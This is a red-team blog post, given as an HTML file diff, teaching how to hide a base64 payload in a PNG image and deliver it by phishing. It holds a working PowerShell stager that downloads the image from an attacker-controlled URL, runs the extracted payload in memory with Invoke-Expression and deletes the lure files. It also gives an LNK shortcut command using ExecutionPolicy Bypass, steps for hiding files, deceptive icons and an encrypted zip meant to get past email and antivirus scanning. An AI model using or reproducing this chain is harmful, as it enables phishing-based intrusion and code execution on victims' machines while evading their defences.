@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Evade Anti-Virus and IDS by hiding payload inside of PNG image and executing it in memory :: The Cybernaut Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="This displays the steps on how to hide a payload inside a PNG image and later pull down the image and execute the hidden payload in memory" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://isaiahnullbyte.github.io/cybernautblog/posts/redteam_2_10-2-23/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://isaiahnullbyte.github.io/cybernautblog/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://isaiahnullbyte.github.io/cybernautblog/favicon.ico">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Evade Anti-Virus and IDS by hiding payload inside of PNG image and executing it in memory">
+<meta property="og:description" content="This displays the steps on how to hide a payload inside a PNG image and later pull down the image and execute the hidden payload in memory" />
+<meta property="og:url" content="https://isaiahnullbyte.github.io/cybernautblog/posts/redteam_2_10-2-23/" />
+<meta property="og:site_name" content="The Cybernaut Blog" />
+
+  
+    <meta property="og:image" content="https://isaiahnullbyte.github.io/cybernautblog/favicon.ico">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-10-02 21:48:52 -0500 CDT" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/cybernautblog/">
+  <div class="logo">
+    ./Cybernaut_Journal
+  </div>
+</a>
+
+    </div>
+    
+    
+  </div>
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://isaiahnullbyte.github.io/cybernautblog/posts/redteam_2_10-2-23/">Evade Anti-Virus and IDS by hiding payload inside of PNG image and executing it in memory</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-10-02</time><span class="post-author">Isaiah Miller</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://isaiahnullbyte.github.io/cybernautblog/tags/redteam/">RedTeam</a>&nbsp;
+      
+      #<a href="https://isaiahnullbyte.github.io/cybernautblog/tags/cybersecurity/">CyberSecurity</a>&nbsp;
+      
+      #<a href="https://isaiahnullbyte.github.io/cybernautblog/tags/evasion/">Evasion</a>&nbsp;
+      
+      #<a href="https://isaiahnullbyte.github.io/cybernautblog/tags/steganography/">Steganography</a>&nbsp;
+      
+      #<a href="https://isaiahnullbyte.github.io/cybernautblog/tags/phishing/">Phishing</a>&nbsp;
+      
+      #<a href="https://isaiahnullbyte.github.io/cybernautblog/tags/obfuscation/">Obfuscation</a>&nbsp;
+      
+      #<a href="https://isaiahnullbyte.github.io/cybernautblog/tags/powershell/">Powershell</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <hr>
+<h1 id="overview">[Overview]<a href="#overview" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Tricking a user into executing your payload through phishing or getting remote code execution with an exploit is often just the beginning. The first thing we want to do when we get code execution on a target machine is establish a remote shell and setup persistence. This can be difficult with AV(anti-virus) scanning every file that touches the disk and intrusion detection systems sniffing network traffic for anything malicous or suspicous. Luckily for us, these type of solutions typically run on signature based detections. Meaning once a file is written to disk AV is comparing it against known bad hashes, specific strings associated with malware, regex patterns, and sometimes byte sequences.</p>
+<p>To defeat anti-virus we will make sure that our payload never touches disk and is executed in memory. The components we use to deliver our phish will bypass email security as well as anti-virus security that is on the target machine. The components of the phish/stager that do touch disc will be further obscured using encoding and benign file extensions. To decrease suspicion; stager code will not contain any operations that will be flagged by AV(Windows Defender in this case).</p>
+<p>To obscure the stagers retrieval of the payload, which will be hosted on the internet, we embed it into a PNG file. When our stager is executed through phishing mechanisms it will make a HTTP Get request to retrieve and extract the payload from the image and then execute it in memory. The stager will even pass a user agent string and use current session credentials for any proxy authentication if one is configured on the target machine when making the request. From a network intrusion detection perspective this is just another HTTP request to retrieve an image to load it in a webpage. This allows us to pull down and execute our payload all while blending in with normal web traffic in the network.</p>
+<p>An added bonus is that if someone were to try and view or load the image which the payload is embedded in the image will render with no issues or errors. This is done by injecting our payload into an image using a tool called ImgInject. I will go into more details about how the tool works later in the blog.</p>
+<p>This technique is not to be confused with bypassing an EDR(Endpoint Detection Response) solution. These have signature based detections but also hook into user land APIs to have more sophisticated and better means of detection. EDRs can be bypassed too but we will start with the basics of evasion.</p>
+<p>To do:</p>
+<p><strong>We will create a phishing payload with means of obsfucation that will bypass email security as well as anti-virus. The stager that is executed during the phish will pull down an image hosted on the web to extract and execute a second payload in memory for further AV evasion.</strong></p>
+<p><img src="/cybernautblog/redteam_post_2/executionChain.png" alt="Execution Flow"></p>
+<p>Lets get started!</p>
+<hr>
+<h1 id="requirements">[Requirements]<a href="#requirements" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p><strong>Attacker Machine(Kali 6.3.0)</strong></p>
+<p>Tools</p>
+<ul>
+<li><a href="https://github.com/blackhat-go/bhg/tree/master/ch-13/imgInject">imgInject</a></li>
+<li><a href="https://linux.die.net/man/1/hexedit">Hexedit</a></li>
+</ul>
+<p><strong>Target Machine(Windows 11 Home Edition)</strong></p>
+<p>Note: This will double as our phishing payload creation machine.</p>
+<p>Tools</p>
+<ul>
+<li><a href="https://www.win-rar.com/download.html?&amp;L=0">WinRar</a></li>
+</ul>
+<hr>
+<h1 id="image-payload-creation">[Image Payload Creation]<a href="#image-payload-creation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p><strong>[Attacker Machine(Kali)]</strong></p>
+<h6 id="crafting-the-payload-to-embed-inside-the-png-image">Crafting the payload to embed inside the PNG image<a href="#crafting-the-payload-to-embed-inside-the-png-image" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h6>
+<p>Before we can embed a payload inside the image of our choice we have to decide what actions we want our payload to perform. This is important because this will ultimately determine the size of the payload that we will be injecting into a PNG image. This in turn will decide what size images we will be able to choose from. The larger the payload the larger the image file will have to be to embed the payload inside it.</p>
+<p>Our stager will be written in powershell for the target windows host and will pull down the image then extract the payload and execute it with Invoke-Expression. For this example I will use executing binary calc.exe as my payload but feel free to use a payload of your choice. Calc.exe will give our test runs a visual representation that we achieved code execution. Also, remember that <strong>the bigger the payload the larger the image file will have to be.</strong></p>
+<p>One last thing. AV is pretty good at detecting powershell reverse shells. Even when executing the reverse shell in memory AV is able to pick up on the &lsquo;New-Object System.Net.Sockets.TCPClient(&lsquo;127.0.0.0&rsquo;,80)&rsquo; string in memory and block it as malicious. This can be bypassed using powershell obuscation scripts to obfuscate your payload before base64 encoding it. I was succesful after trying 3 different obuscation scripts that attempted different techniques. Another work around may have been to execute an method of reverse shell outside of powershell. Like creating the payload to execute spawn cmd.exe etc. This may bypass the &lsquo;regex&rsquo; string based detections in memory.  If this is your first rodeo you may want to try with a simple payload first and then alter your payload to contain more complexity.</p>
+<p>Original payload:</p>
+<p><code>C:\Windows\System32\calc.exe</code></p>
+<p>Now we could embed the payload just like that plaintext into the image and the stager will pull it down and execute it in memory but we will add a layer of obfuscation. We will base64 encode the payload string. Not only is this an easy defense for IDS sniffing network traffic and files passing over the network but for more complicated payloads it prevents special characters from being interpreted over the network or when being loaded into memory by powershell.</p>
+<p><strong>Encode payload:</strong></p>
+<p>Note: When using this command notice the extra backslash character after System32. The echo command would break the string without it.</p>
+<p><code>echo 'C:\Windows\System32\\calc.exe' | base64</code></p>
+<p>Base64 encoded payload:</p>
+<p><code>QzpcV2luZG93c1xTeXN0ZW0zMlxjYWxjLmV4ZQo=</code></p>
+<p><strong>Base64 decode your payload to make sure the full string was encoded:</strong></p>
+<p><code>echo 'QzpcV2luZG93c1xTeXN0ZW0zMlxjYWxjLmV4ZQo=' | base64 -d</code></p>
+<p>We want our image to still be able to render after we hide our payload inside of it. PNG files have a certain header and byte sequence format. If any critical bytes are over written then the image will no longer properly render. The tool ImgInject will help us to be able to identify these bytes and identify how much space we have available to freely inject our payload and not corrupt the image file. It also will perform the injection of our base64 encoded payload into the image file&rsquo;s safe bytes.</p>
+<h6 id="installing-hexedit">Installing Hexedit<a href="#installing-hexedit" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h6>
+<p>We will need this tool later to verify the offset of where the payload is injected into within the image. Its quick and easy.</p>
+<p><code>sudo apt-get update -y</code></p>
+<p><strong>Install Hexedit</strong></p>
+<p><code>sudo apt-get install -y hexedit</code></p>
+<h6 id="installing-imginject">Installing ImgInject<a href="#installing-imginject" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h6>
+<p><strong>Git clone Github project</strong></p>
+<p><code>git clone https://github.com/blackhat-go/bhg.git</code></p>
+<p><strong>Change into the directory containing imgInject</strong></p>
+<p><code>cd bhg/ch-13/imgInject/</code></p>
+<p>From this directory we will run the imgInject tool. Now lets select our image of choosing. Any image downloaded from the internet or already existing on the attacker machine can be used. Save the image in the PNG format as this tool works specifically with these type of image files.</p>
+<p>This is the image I choose. It shows Mario carrying our &ldquo;shell&rdquo; to the target. This image has been resized to be alot smaller than the original one that was used to inject the payload.</p>
+<p><img src="/cybernautblog/redteam_post_2/trojanHorse.png" alt=""></p>
+<p>Before we look for safe bytes in the image lets determine how many bytes our encoded payload is. This will let us know quickly if the image file we choose contains enough safe bytes to embed our payload in.</p>
+<p><strong>Determine payload bytes</strong></p>
+<p>Note: One ASCII string is equal to one byte.</p>
+<p><code>awk 'BEGIN{print length(&quot;&lt;Base64 encoded payload&gt;&quot;)}'</code></p>
+<p><img src="/cybernautblog/redteam_post_2/payloadSize.png" alt=""></p>
+<p>Current base64 encoded payload is 40 bytes. Now lets find enough safe bytes within a PNG file to hide the payload.</p>
+<p><strong>Identify the critical bytes with imgInject</strong></p>
+<p><code>go run main.go -i /path/to/&lt;image file&gt;.png -m -s</code></p>
+<p>There will be alot of output mapping out the PNG file format and labeling the critical bytes. In the output you want to <strong>pay attention to the &ldquo;Chunk Importance&rdquo; and look for sections that are &ldquo;Ancillary&rdquo;</strong>. These can be over written without issue. Looks for these chunks in a row. The chunk length for each chunk can be added together giving you your total available bytes to write a payload without corrupting the image and making it not able to render.</p>
+<p>Ancillary chunks in a row:</p>
+<p><img src="/cybernautblog/redteam_post_2/imgInject1.png" alt=""></p>
+<p>As seen in the screenshot chunks # 5 and 6 have a combined chunk length of 50 bytes which is enough to fit our base64 payload. I also noticed these &ldquo;Chunk Types&rdquo; are &ldquo;text&rdquo;. If you overwrite only Ancillary chunks and the image doesn&rsquo;t render properly then look for text chunk types specifically.</p>
+<p><strong>Make note of the first chunks &ldquo;Chunk Offset&rdquo;</strong> as we will need it for the next command when we inject the payload into the image using the imgInject tool.</p>
+<p><strong>Inject payload into PNG image with imgInject</strong></p>
+<p><code>go run main.go -i /path/to/&lt;image file&gt;.png -o &lt;injected image&gt;.png --inject --offset 0x46 --payload &lt;base64 encoded payload&gt;</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-i is the image we want to use
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-o is the new file we will create with the injected payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--inject inject data at the offset location specified
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--offset is the chunk offset we are replacing with our payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--payload is the payload (as a string)
+</span></span></code></pre></div><p><img src="/cybernautblog/redteam_post_2/injectedImg.png" alt=""></p>
+<p>Double click the newly created injected image and verify that it renders. If everything checks out lets move on to creating the powershell stager which will be triggered by a target user during the phish.</p>
+<hr>
+<h1 id="powershell-stager">[Powershell Stager]<a href="#powershell-stager" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p><strong>[Attacker Machine(Kali)]</strong></p>
+<h6 id="details">Details<a href="#details" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h6>
+<p>This script will be triggered by the target user. Its purpose is to send a HTTP GET request to retrieve the image and then extract the payload, decode it, then execute it all in memory. The HTTP GET will contain a User-Agent string header masquerading as a windows 10 based host/browser. If a proxy is configured in the windows settings on the target host the request will use the proxy and pass the current user sessions credentials to the proxy if the proxy requires authentication.</p>
+<p>We want to avoide anti-virus and the best way to do that is execute in memory. However, since this mechanism will be triggered by the phish and has to touchthe disk on order to do that we will make sure the script performs simple operations on the target host so that signature based detections are not triggered. <strong>To add another layer of obfuscation we will encode the entire script in base64</strong> and save it to a text file. This does two things. When the file touches disk and is at rest the script is encoded so the code and its operations are not visible to clear text. Even if the anti-virus was to detect the encoding and decode the string it will still be basic benign operations being performed. By saving the encoded script into a text file we avoid extra scrutiny that signature based detections might run on a script file (.ps1 file in this case).</p>
+<p><strong>The trigger to decode and executed the stager script will be achieved by abusing a lnk file.</strong> This will be discussed in more detail in the phish payload section.</p>
+<p>Lets view and modify our powershell stager script before we encode it for our phishing payload. Notice there are also aspects and actions on behalf of the phish that will take place when the stager is triggered. These actions will clean up some files and perform some actions relative to the phish providing further deception to the target user. Details about that will come later.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Phish decoy file</span>
+</span></span><span style="display:flex;"><span>$pdfFilePath = [<span style="color:#66d9ef">System.IO.Path</span>]::Combine([<span style="color:#66d9ef">System.Environment</span>]::GetFolderPath(<span style="color:#e6db74">&#34;UserProfile&#34;</span>), <span style="color:#e6db74">&#34;Downloads\&lt;zip folder&gt;\&lt;phish&gt;.pdf&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Phish decoy action</span>
+</span></span><span style="display:flex;"><span>Set-ItemProperty -Path $pdfFilePath -Name Attributes -Value <span style="color:#ae81ff">0</span> -ErrorAction SilentlyContinue
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Define the URL of the PNG image to download</span>
+</span></span><span style="display:flex;"><span>    $imageUrl = <span style="color:#e6db74">&#34;http://&lt;your domain&gt;/&lt;injected image&gt;.png&#34;</span> <span style="color:#75715e"># Can change to HTTPS (Extra layer of security)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $webClient = New-Object System.Net.WebClient
+</span></span><span style="display:flex;"><span>    $webClient.Proxy = [<span style="color:#66d9ef">System.Net.WebRequest</span>]::GetSystemWebProxy()
+</span></span><span style="display:flex;"><span>    $webClient.Proxy.Credentials = [<span style="color:#66d9ef">System.Net.CredentialCache</span>]::DefaultNetworkCredentials
+</span></span><span style="display:flex;"><span>    $webClient.Headers.Add(<span style="color:#e6db74">&#34;User-Agent&#34;</span>, <span style="color:#e6db74">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&#34;</span>) <span style="color:#75715e"># This can be change to any user agent to masquerade as any type of device making the HTTP request</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Download the PNG image from the URL</span>
+</span></span><span style="display:flex;"><span>    $imageBytes = $webClient.DownloadData($imageUrl)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $startOffset = 0x100   <span style="color:#75715e"># Offset of payload that was verified with hexedit</span>
+</span></span><span style="display:flex;"><span>    $textLength = <span style="color:#ae81ff">100</span>      <span style="color:#75715e"># Length of payload</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Extract the embedded text from the image bytes as hexadecimal</span>
+</span></span><span style="display:flex;"><span>    $embeddedTextHex = $imageBytes[$startOffset..($startOffset + $textLength - <span style="color:#ae81ff">1</span>)]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Convert the extracted hexadecimal text to a string</span>
+</span></span><span style="display:flex;"><span>    $embeddedText = [<span style="color:#66d9ef">System.Text.Encoding</span>]::ASCII.GetString($embeddedTextHex)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Decode the base64-encoded text</span>
+</span></span><span style="display:flex;"><span>    $decodedText = [<span style="color:#66d9ef">System.Text.Encoding</span>]::UTF8.GetString([<span style="color:#66d9ef">System.Convert</span>]::FromBase64String($embeddedText))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Execute the decoded text as a PowerShell script</span>
+</span></span><span style="display:flex;"><span>    Invoke-Expression -Command $decodedText
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">catch</span> {
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Phish clean up</span>
+</span></span><span style="display:flex;"><span>    $textFilePath = [<span style="color:#66d9ef">System.IO.Path</span>]::Combine([<span style="color:#66d9ef">System.Environment</span>]::GetFolderPath(<span style="color:#e6db74">&#34;UserProfile&#34;</span>), <span style="color:#e6db74">&#34;Downloads\&lt;zip folder&gt;\&lt;encoded stager&gt;.txt&#34;</span>)
+</span></span><span style="display:flex;"><span>    Remove-Item -Path $textFilePath -Force -ErrorAction SilentlyContinue
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">catch</span> {
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Phish clean up</span>
+</span></span><span style="display:flex;"><span>    $zipFolderPath = [<span style="color:#66d9ef">System.IO.Path</span>]::Combine([<span style="color:#66d9ef">System.Environment</span>]::GetFolderPath(<span style="color:#e6db74">&#34;UserProfile&#34;</span>), <span style="color:#e6db74">&#34;Downloads\&lt;phish&gt;.zip&#34;</span>)
+</span></span><span style="display:flex;"><span>    Remove-Item -Path $zipFolderPath -Recurse -Force -ErrorAction SilentlyContinue
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">catch</span> {
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>There is alot that can be modified in the script to your preference.</strong> For now we will use hexedit to identify the true injected payload offset and update the script.</p>
+<p><code>hexedit &lt;injected image&gt;.png</code></p>
+<p>If you remember the offset that we provided imgInject to inject the payload we can start navigating towards that with the arrow keys. While passing over the bytes with the arrow keys you can see its string correspondance to the right of the screen. <strong>Move over the bytes until the first letter of your base64 encoded payload string is highlited.</strong></p>
+<p><img src="/cybernautblog/redteam_post_2/hexedit_img.png" alt="Hexedit Injected Image"></p>
+<p>When the first letter of the payload string is highlighted view the very bottom of the hexedit terminal to see the offset. This is the offset we want to put in our powershell stager script.</p>
+<p><img src="/cybernautblog/redteam_post_2/payload_offset.png" alt="Offset of payload"></p>
+<p>The payload offset is 0x4E. CTRL + C to close Hexedit.</p>
+<p><strong>Update the powershell stager script to reflect this offset and also the payload length.</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$startOffset = 0x4E   <span style="color:#75715e"># Offset of payload that was verified with hexedit</span>
+</span></span><span style="display:flex;"><span>$textLength = <span style="color:#ae81ff">40</span>      <span style="color:#75715e"># Length of payload</span>
+</span></span></code></pre></div><p><strong>We will come back to this script later to modify the files paths and names related to the zip phishing payload.</strong></p>
+<p>Also, note that your injected image can be hosted anywhere. Instead of hosting it on a server that you control it can be hosted on any public site that lets you upload/host an image and reach a direct url link to the hosted image itself.</p>
+<p>At this point feel free to update the image url and test this early version of the stager on the windows machine. If the image is injected properly and hosted when running the stager your payload should execute. In my case I get a visual respresentation that calc.exe started.</p>
+<hr>
+<h1 id="phishing-payload">[Phishing Payload]<a href="#phishing-payload" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p><strong>[Attacker Machine(Kali)]</strong></p>
+<h5 id="details-1">Details<a href="#details-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h5>
+<p>This image injection technique is covert and the stager we created to extract the payload and execute it is also able to avoid AV. Now the question stands how will we ever get the stager to execute and grab the payload in the first place?</p>
+<p>Time to go fishing!</p>
+<p><img src="/cybernautblog/redteam_post_2/phishing.png" alt="Phishing"></p>
+<p>(Still got the Mario theme going here)</p>
+<p><strong>This phishing payload will combine an encrypted zip file and an archived lnk file that will trigger the stager. The lnk file will be modified in a way that when double clicked it will run a powershell command to read our base64 encoded powershell stager script from a hidden text file and execute it in memory. The stager will then in turn download the image embedded payload and execute that in memory as well.</strong></p>
+<p>Since the zip file is encrypted and password protected no email security, anti-virus, or EDR will be able to scan it because they do not know the password to open it. This will alow us to deliver it via email to the target user with a phishing scenario based on persuading the user to verify an important confirmation in a PDF. The email will contain instructions on how to download the attached zip file from the email, extract it to the Downloads folder, and provide the password that was also included in the steps.</p>
+<p>The other actions in the powershell stager will help in further deception to the user after they have clicked the lnk file. When the user extracts the password protected zip they will only see the lnk file appear because all the other files included in the zip will be hidden. The lnk will have a deceptive icon and name to entice the target user to click.</p>
+<p><strong>Lets identify all of our files names for our zip phishing payload so that the powershell stager script can be updated and encoded.</strong> Once the powershell stager script is finalized and then base64 encoded we will be ready to create the encrypted zip phishing payload.</p>
+<p><strong>Zip Files:</strong>
+<!-- raw HTML omitted -->.txt # After updating the stager script and base64 encoding it we will save it in this file (lnk file triggers powershell to decode and runs this in memory)
+<!-- raw HTML omitted -->.txt # This file will be hidden until the stager runs and will appear visible to the user adding to deception. This can be a real PDF.
+<!-- raw HTML omitted -->.lnk # We will create this on a windows host and modify it appropiately for our phish</p>
+<p><strong>Modify Powershell Stager script:</strong></p>
+<p>Note: &ldquo;Zip folder&rdquo; is the folder that is created when the encrypted zip file is extracted. The folder created will be the name of the zip file and contain all the files.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$pdfFilePath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath(&#34;UserProfile&#34;), &#34;Downloads\&lt;<span style="color:#f92672">zip</span> <span style="color:#a6e22e">folder</span>&gt;\&lt;<span style="color:#f92672">decoy</span>&gt;.pdf&#34;)
+</span></span><span style="display:flex;"><span>$textFilePath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath(&#34;UserProfile&#34;), &#34;Downloads\&lt;<span style="color:#f92672">zip</span> <span style="color:#a6e22e">folder</span>&gt;\&lt;<span style="color:#f92672">base64</span> <span style="color:#a6e22e">encoded</span> <span style="color:#a6e22e">stager</span>&gt;.txt&#34;)
+</span></span><span style="display:flex;"><span>$zipFolderPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath(&#34;UserProfile&#34;), &#34;Downloads\&lt;<span style="color:#f92672">zip</span> <span style="color:#a6e22e">payload</span>&gt;.zip&#34;)
+</span></span></code></pre></div><p>Once everything is modified remove all the comments in the script. This gives even less for the anti-virus signature based detections to match on. The powershell stager script is now ready to be base64 encoded and saved to a text file that will be zipped in the encrypted zip payoad. At this point I like to turn my stager script into a one liner before encoding but it is not necessary.</p>
+<p><strong>Base64 encode the stager script and save it to a text file:</strong></p>
+<p><code>cat stager-script.txt | base64 &gt; encoded-stager-script.txt</code></p>
+<p>**Base64 decode the script to make sure all of it was encoded properly:</p>
+<p><code>cat encoded-stager-script.txt | base64 -d</code></p>
+<p>The encrypted zip payload will be created on the windows host. Move the base64 encoded stager txt file to the windows host so that it can be zipped along with the other files.</p>
+<hr>
+<h1 id="phishing-payload-creation">[Phishing Payload Creation]<a href="#phishing-payload-creation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p><strong>[Target Machine(Windows)]</strong></p>
+<h5 id="details-2">Details<a href="#details-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h5>
+<p>The key components to this phishing payload are the encrypted zip file to bypass security measures with delivery and carry the powershell stager script along with the lnk file that will trigger it.</p>
+<p>Lnk files are basically shortcut files which are typically found on the desktop or can exist in other directories. There is a file attribute in lnk files called &ldquo;Target Path&rdquo;. Usually the target path just points to the file path and binary of the application that the shortcut (or lnk file) was created for. <strong>When we create a new lnk file we can set this attribute to point to powershell.exe and run a command to load the base64 encoded stager text file into memory, decode, and execute it. If the user can be persuaded to extract the zip file and double click the lnk file then we have code execution and our image embedded payload will get executed as well.</strong></p>
+<p>One of the challenges I ran into was that the Target Path attribute in the lnk file has a maximum character limit of 260.It turns out that this limit is imposed by Microsoft for max file name character limits. After all we are abusing an attribute that is just meant to point to another file. These limitations inspired me to store the stager script encoded in a text file. The limit is ultimately bypassed in this scenario because the encoded script can contain as many operations or lines of code as desired. Also, there is still obfuscation when it touches disk as its extracted from the zip file. Not to mention the anti-virus doesn&rsquo;t see any evidence of a script due to its encoding and file extension. Looking at this from a process perspective on the target host a powershell command is seen reading and decoding and invoking a text file. (Suspicous behavior but will most likely bypass triggering script based detections.)</p>
+<h5 id="creating-lnk-file">Creating LNK file<a href="#creating-lnk-file" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h5>
+<p>While creating the LNK file we will provide a command in the &ldquo;Target Path&rdquo; attribute that will use powershell to decode and execute the powershell stager.</p>
+<p>First open windows explorer to any directory that you want to create the LNK file in.</p>
+<p><strong>Create LNK file</strong></p>
+<p>(Inside windows explorer) Right click -&gt; New -&gt; Shortcut</p>
+<p><strong>Add command to Target Path</strong></p>
+<p>(Type the location of the item: field) <strong>Paste and modify the following command:</strong></p>
+<p>Note: Feel free to run this command in the same directory as the powershell stager first to ensure its able to properly decode and run your stager script.</p>
+<p><code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -ExecutionPolicy Bypass -C &quot;[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Get-Content -Path \&quot;$env:USERPROFILE\Downloads\&lt;Zip Folder&gt;\&lt;Base64 encoded stager&gt;.txt\&quot;))) | Invoke-Expression&quot;</code></p>
+<p><img src="/cybernautblog/redteam_post_2/targetpath_lnk.png" alt="LNK Target Path"></p>
+<p><strong>Keep in mind that the character limit for the Target Path is 260 characters.</strong> While still being able to perform all the operations necessary to decode and execute the stager script I was able put together a command that is 257 characters long. To save on character space I truncated powershell arguments to the shortest versions possible and used enviroment variables to shorten the file path. Consider this when deciding on the zip folder name and base64 encoded file name.</p>
+<p><strong>Configure the rest of the LNK file:</strong></p>
+<p>Click next -&gt; Insert LNK name (Make it compliment phish scenario) -&gt; Finish</p>
+<p><strong>Change properties of LNK file:</strong></p>
+<p>We are not done yet. Changing properties about the LNK file will help our phishing chances. An icon can be set to make the file appear as if it performs operations or is related to other applications.</p>
+<p>(LNK File) Right click -&gt; Properties -&gt; (Start in: field) <strong>Enter this directory:</strong></p>
+<p><code>%UserProfile%\Downloads</code></p>
+<p>(Properties Window) Click Change Icon -&gt; (Look for icons in this file: field) <strong>Paste this file</strong>:</p>
+<p><code>%SystemRoot%\System32\SHELL32.dll</code></p>
+<p>Click Ok. There will be an error but it will take you into the directory where alot of built windows icons are available for our choosing with many to pick from. Select which ever one you want to be used with the LNK file that you think will entice the user to trust the file and click.</p>
+<p><img src="/cybernautblog/redteam_post_2/icon_lnk.png" alt="LNK icon"></p>
+<p>Select icon -&gt; click ok -&gt; click apply</p>
+<p>With the LNK file finished we are ready to gather all of our files together and zip/encrypt them to be delivered via email.</p>
+<h5 id="gather-all-files-for-phish-payload">Gather all files for phish payload<a href="#gather-all-files-for-phish-payload" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h5>
+<p>Move all the following files to the same directory on the windows host machine.</p>
+<ul>
+<li>Base64 encoded powershell stager</li>
+<li>LNK file</li>
+<li>Decoy file (In our case a random PDF file)</li>
+</ul>
+<p><strong>Set the Stager and LNK file attributed as hidden:</strong></p>
+<p>Note: Unless the user has their explorer settings set to view hidden files these files will not be visible to the user when the zip is extracted.</p>
+<p>Right click file -&gt; Properties -&gt; Check Attributes as &lsquo;Hidden&rsquo; (Do this for the stager script and decoy file )</p>
+<p><img src="/cybernautblog/redteam_post_2/hidden_property.png" alt="Hidden Attribute"></p>
+<p>The decoy file is hidden because our stager script will remove the hidden attribute while our image embedded payload executes. This will give a visual deception that an action was taken after click the LNK file and the true file is now ready to be viewed.</p>
+<p>Everything is set and we can now wrap it up in a bow or in other words our encrypted zip file.</p>
+<h5 id="installing-winrar">Installing Winrar<a href="#installing-winrar" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h5>
+<p><strong>Download Winrar to Windows host machine:</strong></p>
